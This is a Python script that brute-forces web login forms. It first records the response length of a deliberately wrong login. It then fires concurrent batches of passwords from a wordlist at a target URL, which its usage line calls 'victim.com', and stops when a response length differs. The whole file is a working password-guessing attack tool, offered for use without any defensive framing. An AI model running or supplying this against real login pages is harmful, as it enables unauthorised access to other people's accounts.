import time
import aiohttp
import asyncio
import sys
import os


async def wrg_pass(session):
    # Getting the sample of request with login and password that are wrong.
    login_data[f'{sys.argv[4]}'] = "admin"
    login_data[f'{sys.argv[5]}'] = "admin"

    async with session.post(url, data=login_data) as resp:
        # print("Wrong pass request", len(str(resp)))
        login_data[f'{sys.argv[4]}'] = sys.argv[2]
        # return len(str(resp))
    async with session.post(url, data=login_data) as resp:
        print("Wrong pass request,(with response that include bad password message)", len(str(resp)))
        # login_data[f'{sys.argv[4]}'] = sys.argv[2]
        return len(str(resp))


async def send_request(session, password, __wrg_pass):
    login_data[f'{sys.argv[5]}'] = password

    async with session.post(url, data=login_data) as resp:
        print(f"Request send to {url}, login: {login_data[f'{sys.argv[4]}']},"
              f" password: {password}. Response length: {len(str(resp))}")
        if len(str(resp)) != __wrg_pass:
            sys.exit(f"Found one, {login_data[f'{sys.argv[4]}']} {password}")


async def period(session, point, __wrg_pass):
    print(f"Sending {default_request_per_period} requests")
    tasks = []
    temp_pass = []
    pointer = open(f"{path_to_wordlist}")
    m = 1

    for i in pointer:
        m += 1
        if point <= m and m < (point + default_request_per_period):
            temp_pass.append(i)
        elif m == (point + default_request_per_period):
            break
    for i in temp_pass:
        tasks.append(asyncio.ensure_future(send_request(session, i.rstrip(), __wrg_pass)))
    await asyncio.gather(*tasks)



async def main():
    async with aiohttp.ClientSession() as session:
        _wrg_pass = await wrg_pass(session)
        for _ in range(50):
            await period(session, _ * default_request_per_period, _wrg_pass)


if __name__ == "__main__":
    if len(sys.argv) >= 6:
        try:
            args = sys.argv
            login_data = {}
            url = f"{sys.argv[1]}"
            login_data[f'{sys.argv[4]}'] = sys.argv[2]
            login_data[f'{sys.argv[5]}'] = "pwd_field"
            path_to_wordlist = f"{sys.argv[3]}"
            default_request_per_period = 24
            if len(sys.argv) == 7:
                default_request_per_period = int(sys.argv[6])

            start_time = time.perf_counter()
            asyncio.run(main())
            print(f"Time {(time.perf_counter() - start_time)}")

        except:
            e = sys.exc_info()
            print("===\n",e[0])
            print(e[1], "\n===\n")
            print("|-> Error, something went wrong, check if server is up and nothing is blocking you connection!"
                  "\n|-> Also check if data that you paste is correct!")

    else:
        print(f"Usage: python3 {os.path.basename(__file__)} 'http://victim.com/' 'username' "
              "'/path/to/wordlist.txt' 'username field name' 'password field name'")
